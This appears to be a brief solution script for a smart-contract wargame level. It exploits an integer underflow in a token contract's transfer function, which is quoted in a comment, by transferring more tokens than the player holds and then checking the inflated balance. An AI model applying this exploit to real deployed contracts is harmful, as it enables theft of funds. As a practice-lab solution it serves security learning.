await contract.balanceOf(player);
await contract.balanceOf(contract.address);

// Underflow
// function transfer(address _to, uint _value) public returns (bool) {
//     require(balances[msg.sender] - _value >= 0);
//     balances[msg.sender] -= _value;
//     balances[_to] += _value;
//     return true;
//   }
await contract.transfer(contract.address, 21);
await contract.balanceOf(player);